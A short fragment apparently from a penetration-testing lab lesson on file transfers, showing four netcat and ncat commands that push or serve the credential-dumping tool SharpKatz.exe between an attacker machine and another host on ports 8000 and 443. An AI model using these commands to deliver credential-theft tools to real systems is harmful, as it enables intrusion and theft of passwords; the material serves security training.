...
Send
```shell
attacker@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

```shell
attacker@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
...
```shell
attacker@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```shell
attacker@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
